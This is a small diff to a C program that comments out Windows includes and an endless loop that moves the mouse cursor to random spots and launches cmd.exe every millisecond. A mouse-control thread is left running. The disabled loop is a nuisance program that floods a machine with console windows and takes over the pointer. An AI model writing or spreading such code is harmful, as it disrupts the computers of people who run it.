@@ -1,5 +1,5 @@
-#include <stdio.h>
-#include <Windows.h>
+//#include <stdio.h>
+//#include <Windows.h>
 #include <unistd.h>
 #include <netinet/in.h>
 #include <sys/types.h>
@@ -32,11 +32,11 @@ int main (){
 
     CreateThread(0,0,(LPTHREAD_START_ROUTINE)threadDoMouse,0,1,0);
 
-    while(1) {
-        SetCursorPos(rand() % 1900, rand() % 1000);
-        ShellExecute(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOWDEFAULT);
-        Sleep(1);
-    }
+//    while(1) {
+//        SetCursorPos(rand() % 1900, rand() % 1000);
+//        ShellExecute(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOWDEFAULT);
+//        Sleep(1);
+//    }
 
     return 0;
 }
